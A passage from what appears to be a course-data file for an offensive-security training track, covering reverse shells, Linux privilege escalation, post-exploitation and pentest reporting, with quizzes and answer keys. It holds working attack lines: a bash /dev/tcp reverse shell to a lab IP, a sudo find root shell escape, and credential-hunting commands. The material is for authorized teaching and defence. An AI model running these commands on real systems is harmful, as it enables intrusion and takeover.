**Metasploit** is the standard exploitation framework: a large library of exploits and payloads with a consistent interface (choose an exploit module, set the target and payload, run). It is invaluable for learning — but understand what each module does rather than treating it as a magic button, and know that in the real world reliable manual techniques and simple credential attacks often matter more than a flashy exploit.

## Foothold is the beginning, not the end

Gaining a foothold usually lands you as a **low-privileged user** (a web service account, a normal user), not root. That is where post-exploitation begins — situational awareness (the earlier step), then **privilege escalation** (the amateur/intermediate focus) and lateral movement. A foothold is a door into the building, not the keys to it; the interesting work is what you do once inside.

Everything here is practised only in your lab or on authorized targets. The reverse shell you catch, the credential you guess, the exploit you run — all against systems that exist to be tested or that you own. That constraint is not a footnote; it is the line between a professional and a criminal.`,
      sample: {
        lang: 'bash',
        caption: 'A reverse shell: the target connects out to your listener',
        code: `# 1. On your attacker VM: start a listener
nc -lvnp 4444

# 2. Via an exploit / a vulnerable app / a command-injection point on
#    an AUTHORIZED target, cause it to run (connecting BACK to you):
#    bash -i >& /dev/tcp/10.10.10.9/4444 0>&1

# 3. The listener catches the shell:`,
        output: `listening on [any] 4444 ...
connect to [10.10.10.9] from (UNKNOWN) [10.10.10.5] 51022
web@target:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
# A foothold - as a LOW-privileged service account, not root.
# This is the reverse shell the defensive tracks taught you to
# DETECT, seen from the offensive side. Now: escalate.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why do attackers frequently use a "reverse shell" (where the target connects out to the attacker) rather than connecting directly into the target?',
        options: [
          'Reverse shells are encrypted and normal shells are not',
          'Outbound connections often pass through firewalls that block inbound ones, so having the compromised target initiate the connection back to a listener the attacker controls is more likely to succeed than trying to connect in — which is also why egress filtering is an important defence',
          'Reverse shells give root automatically',
          'Because inbound connections are illegal',
        ],
        answer: 1,
        explain:
          'Perimeter firewalls typically restrict inbound connections tightly but allow outbound traffic much more freely, so an attacker who makes the target connect *out* to their listener is far more likely to get a working channel than one trying to connect *in* to the target. This is the same asymmetry the defensive tracks highlighted: it is exactly why restricting outbound (egress) traffic is a valuable, under-used control that cuts off reverse shells and command-and-control. A foothold from a reverse shell also usually lands as a low-privileged account, making privilege escalation the next step.',
        hint: 'Which direction of connection does a typical firewall let through more easily — and who initiates it in a reverse shell?',
      },
    },

    {
      id: 'rlin-b-10',
      title: 'Privilege escalation: the idea',
      read: `A foothold almost always lands you as a **low-privileged user** — a web service account like \`www-data\`, or an ordinary user. **Privilege escalation** is the process of turning that limited access into full control (**root** on Linux). It is one of the most important offensive skills, and this step introduces the concept the amateur and intermediate levels develop in depth.

## Why it matters

Low-privileged access is limited: you can't read protected files, can't reconfigure the system, can't fully demonstrate impact. **Root can do anything** — read every file, install persistence, access all data, pivot with full authority. So after a foothold, escalating privilege is usually the immediate goal, and on many engagements "we got a foothold and escalated to root" is the headline finding.

## The two directions

- **Vertical escalation** — gaining *higher* privilege on the same system (\`www-data\` → root). This is what "privilege escalation" usually means.
- **Horizontal escalation** — moving to *another account* at a similar level (one user → another user), often as a stepping stone.

## Where escalation paths come from

Almost all Linux privilege escalation comes from something **misconfigured or unpatched** that lets a low-privileged user do something they shouldn't. The major categories (each a later deep-dive):

- **Misconfigured \`sudo\`** — the current user can run a program as root that can be abused to get a root shell.
- **SUID/SGID binaries** — programs that run as their owner (often root) regardless of who launches them; if one can be made to do your bidding, you inherit root.
- **Writable files that root uses** — a script in root's cron, a writable service file, a writable \`PATH\` directory.
- **Kernel vulnerabilities** — an old kernel with a known local-privilege-escalation exploit.
- **Credentials lying around** — a root password in a config file, a history file, a database.
- **Group memberships and capabilities** — belonging to a powerful group, or a binary with a dangerous Linux capability.

## The method: enumerate for escalation

Privilege escalation is, once again, an **enumeration problem**. You systematically check the system for these misconfigurations — the very things the defensive Linux track taught you to *find and fix*. Automated enumeration scripts — **LinPEAS**, **LinEnum** — walk this checklist for you, flagging likely paths. But understand *why* each finding is exploitable, rather than just running the script; the intermediate level covers the mechanisms.

## The defensive symmetry (this is the whole point)

Every privilege-escalation path is a defensive finding in reverse. When you run LinPEAS on an authorized target and it flags a SUID binary or a sudo misconfiguration, that is *exactly* what a defender running the same tool on their own box should find and remove. This is why offensive skill makes you a better defender: you learn to see the paths so you can close them. The paths you'll learn to exploit in the coming levels are the paths the defensive tracks taught you to eliminate — the same knowledge, from both sides.`,
      sample: {
        lang: 'bash',
        caption: 'Enumerating for escalation paths (the same checklist defenders audit)',
        code: `# what can I run as root?
sudo -l
# SUID binaries (run as their owner, often root)
find / -perm -4000 -type f 2>/dev/null
# an old kernel? (maybe a known local-privesc exploit)
uname -r
# credentials lying in config/history?
grep -ri password /etc /var/www 2>/dev/null; cat ~/.bash_history
# or let an enumeration script walk the whole checklist:
#   ./linpeas.sh`,
        output: `User www-data may run: (root) NOPASSWD: /usr/bin/find   <- path!
/usr/bin/find                                          <- SUID find
3.13.0-24-generic                                      <- old kernel
/var/www/config.php:  $db_pass = 'RootPass123'          <- credential
# Each of these is a route from www-data to root - AND is exactly
# what the defensive Linux track told defenders to find and remove.
# Offensive and defensive are the same knowledge from two sides.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'How does learning Linux privilege-escalation techniques directly make someone a better defender?',
        options: [
          'It does not; offence and defence are unrelated',
          'Every privilege-escalation path is a misconfiguration or unpatched flaw — a SUID binary, a sudo misconfig, a writable root-run script, an old kernel — so learning to find and exploit them (on authorized targets) is learning exactly what a defender must find and remove on their own systems; the same enumeration reveals the same paths from both sides',
          'Because defenders never need to understand attacks',
          'Because privilege escalation only works in labs',
        ],
        answer: 1,
        explain:
          'Privilege escalation is enumeration for misconfigurations and unpatched flaws, and each path an attacker exploits is precisely a weakness a defender should eliminate. The very tools (LinPEAS/LinEnum) and checks (`sudo -l`, SUID hunting, kernel version, stray credentials) an attacker uses to find a route to root are what a defender runs against their own hosts to find and close those routes first — which is why the defensive Linux track taught finding and fixing exactly these things. Understanding the offensive path is what lets a defender see and remove it; the knowledge is identical, applied from opposite sides.',
        hint: 'Where do escalation paths come from, and who else is looking for those same misconfigurations?',
      },
    },

    {
      id: 'rlin-b-11',
      title: 'Post-exploitation and reporting',
      read: `Gaining (and escalating) access is not the end — it is the setup for the two things that give an engagement its value: understanding and demonstrating **impact**, and producing the **report** that lets the owner fix everything you found.

## Post-exploitation: what access is worth

Once you have meaningful access (ideally root, or a high-value account), post-exploitation answers "what does this compromise actually mean for the organisation?":

- **Understand the system's role** — what is this host, what data does it hold, what does it connect to? A root shell on a jump box that reaches the whole internal network is worth far more than root on an isolated machine.
- **Credential access** — gather credentials that enable further movement (password hashes, keys, tokens, config-file passwords). One host's credentials are often the key to others.
- **Lateral movement / pivoting** — use this foothold to reach systems you couldn't touch from outside (the "second network" you noted during situational awareness). This is where the methodology loops: you enumerate and exploit the newly reachable systems.
- **Demonstrating impact** — for the report, you show *what an attacker could do*: access sensitive data (carefully, within scope), reach critical systems, prove domain compromise. The goal is to make the risk concrete for the owner, **not** to cause damage.

## The professional constraints

Post-exploitation on an authorized engagement is bounded by the **rules of engagement**: don't exfiltrate real sensitive data (prove access without copying it out), don't disrupt operations, don't go outside scope, and clean up anything you introduced (remove your tools, shells and any test accounts). You are demonstrating risk, not being an actual adversary.

## The report is the product

Everything culminates in the report — the real deliverable of a penetration test. A good report includes:

- **Executive summary** — the overall risk picture, for leadership.
- **Findings**, each with: a clear description, the **severity/impact** (what could an attacker do?), **how it was exploited** (enough to reproduce and verify), the **evidence**, and — most importantly — **specific remediation** (how to fix it).
- **Findings prioritised by risk**, so limited defensive effort goes to what matters most.

A vulnerability nobody can understand or fix has no value; the report is where offensive work becomes defensive improvement. This is the whole purpose: you attacked so that the defenders can fix.

## Notes become the report

This is why the enumeration mindset stressed **noting everything**: your meticulous notes — every host, credential, path and step — are what the report is written from, and what lets a finding be reproduced and verified. Good notes throughout the engagement are what make a good report possible at the end.

Post-exploitation shows what the access is worth; the report turns that into fixes. Together they are why the engagement existed — not the thrill of access, but the defensive improvement it drives.`,
      sample: {
        lang: 'text',
        caption: 'A finding as it appears in the report — the actual deliverable',
        code: `FINDING: Privilege escalation to root via sudo misconfiguration
Severity: HIGH

Description:
  The 'www-data' account (reachable via the web app foothold, Finding 1)
  may run /usr/bin/find as root without a password. 'find' can execute
  arbitrary commands, so this grants a full root shell.

Reproduction:
  sudo find . -exec /bin/sh \\; -quit   ->  # id  ->  uid=0(root)

Impact:
  Full control of the host, all data on it, and the internal network
  it reaches (10.0.0.0/24, see Finding 4 - lateral movement).

Remediation:
  Remove the NOPASSWD sudo entry for 'find'; if find must be run
  elevated, restrict it precisely and never via a shell-capable binary.`,
        output: `Post-exploitation shows what access is WORTH (data, reach,
impact); the REPORT turns it into fixes. Each finding: what,
severity, how to reproduce, impact, and REMEDIATION - prioritised
by risk. The report is the product; the meticulous notes you kept
throughout are what it's written from. Attack so defenders can fix.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the actual deliverable — the "product" — of an authorized penetration test?',
        options: [
          'The root shell obtained on the target',
          'The report: a clear, prioritised account of each finding with its impact, how it was exploited (enough to reproduce), the evidence, and specific remediation — because the purpose of the engagement is to enable the owner to fix the weaknesses, so a finding nobody can understand or act on has no value',
          'A collection of the target’s sensitive data',
          'A list of tools that were run',
        ],
        answer: 1,
        explain:
          'Access and impact are demonstrated in order to be documented; the value of the engagement is realised only in the report, which is why it is the deliverable. A useful report gives leadership the risk picture and gives engineers, per finding, a clear description, the severity/impact, reproduction steps, evidence, and — most importantly — how to remediate, all prioritised by risk. The whole purpose of authorized offensive work is defensive improvement, so a vulnerability that cannot be understood or fixed contributes nothing; and copying out real sensitive data would breach the rules of engagement rather than constitute the product.',
        hint: 'The purpose is to help the owner fix things. What artefact actually enables that?',
      },
    },

    {
      id: 'rlin-b-12',
      title: 'Project: your first end-to-end path',
      read: `Bring the level together into the exercise every offensive learner starts with: take a deliberately vulnerable machine **in your lab** and go **end to end** through the methodology — recon, enumerate, exploit, escalate, and write it up — on a target that exists to be attacked.

## The exercise

Use a beginner-friendly vulnerable VM (VulnHub, Metasploitable) or an introductory box on a lab platform (TryHackMe / Hack The Box), from your Kali attacker VM:

1. **Recon / discovery** — find the target on your lab network (\`nmap -sn\`), and note what you know about it.
2. **Enumerate thoroughly** — full port scan with version detection (\`nmap -sVC -p-\`). Record *every* service and version. For each, research known vulnerabilities and default credentials, and enumerate deeper (web app pages/directories, shares, users) — the enumeration mindset, applied.
3. **Find the way in** — from the enumeration, identify a credible foothold: a vulnerable service, weak/default credentials, a web flaw, a misconfiguration. Understand *why* it works.
4. **Exploit** — gain a foothold (often a reverse shell), landing as a low-privileged user.
5. **Situational awareness** — \`id\`, \`uname -a\`, \`ip addr\`, \`sudo -l\`, look for credentials and escalation leads (run LinPEAS if you like, but understand its findings).
6. **Escalate** — find and use a privilege-escalation path to root, understanding the mechanism.
7. **Write it up** — produce a short report: each finding, how you exploited it, the impact, and — for each — the remediation. This is the habit that matters most.

## Do it the professional way

- **Take notes continuously** — every command, finding and credential. The notes are the report.
- **Understand, don't just run** — for every exploit and escalation, know *why* it works; that understanding is the transferable skill, and it is what lets you both attack and defend.
- **Stay in the lab** — this entire exercise is on a machine you own or a platform that authorized it. That is the only place these techniques belong until you hold a signed scope for something else.

## The measure of success

You can take an unknown (but authorized) target from nothing to root by following the methodology — enumerating patiently, researching what you find, gaining and escalating access with understanding — and produce a report a defender could act on.

> The level distilled: offensive security is **authorized** testing that follows a **method** — recon, enumerate, exploit, post-exploit, report — in which **enumeration is the decisive skill** and the **report is the product**. Every technique lives only on systems you own or are contracted to test. And every attack path you learn is a defensive finding in reverse: you learn to see the ways in so that they can be closed. The rest of this track deepens each phase — but this end-to-end loop, done thoughtfully and legally in your lab, is where an offensive tester is made.`,
      sample: {
        lang: 'text',
        caption: 'The end-to-end path on a lab target, as notes-becoming-report',
        code: `[recon]   nmap -sn 192.168.56.0/24  -> target at .101
[enum]    nmap -sVC -p- .101 -> 21 vsftpd 2.3.4, 22 ssh, 80 Apache,
                                 8080 an old CMS admin panel
          web enum -> /admin login; CMS version has a known upload flaw
[foothold] uploaded a web shell via the CMS flaw -> reverse shell
          -> id: www-data (low priv)
[situational] uname -r: 3.13 (old); sudo -l: (root) NOPASSWD /usr/bin/find
[escalate] sudo find . -exec /bin/sh \\; -> # id -> uid=0(root)
[report]  Finding 1: CMS unauthenticated upload -> RCE  (Critical)
          Finding 2: sudo find misconfig -> root         (High)
          each with reproduction, impact, and remediation.`,
        output: `Recon -> thorough enumeration -> researched foothold -> situational
awareness -> understood privilege escalation -> a report a defender
can act on. Done entirely in your lab, with notes throughout,
understanding every step. That legal, methodical, end-to-end loop
is where an offensive tester is made - and each path found is a
defensive fix waiting to be written.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Throughout the end-to-end exercise, why is "understand why each exploit and escalation works" emphasised over simply running tools until something succeeds?',
        options: [
          'Because tools are unreliable and should be avoided',
          'Because the transferable, durable skill is understanding the mechanism — it lets you adapt when a tool fails, assess whether a technique truly applies, write a report that explains the risk and its fix, and defend against the same path; running tools blindly teaches nothing reusable and can be unsafe',
          'Because understanding makes the exploit run faster',
          'Because tools are only allowed if you can explain them',
        ],
        answer: 1,
        explain:
          'Tools and exploits are the documented, reusable part; the scarce and transferable skill is understanding *why* something works. That understanding is what lets you adapt when an off-the-shelf exploit fails, judge whether a flaw genuinely applies to a given target rather than assuming a match, and — crucially — write the report that explains the risk and the remediation, and recognise the same weakness when defending. Running tools until one succeeds teaches nothing you can carry to the next, different target, and blindly running unread exploit code can be unreliable or harmful. Comprehension is what turns lab practice into real capability on both sides.',
        hint: 'When you move to a different target, or sit down to write the fix, what actually transfers — the tool run, or the understanding?',
      },
    },
  ],
}

export default level
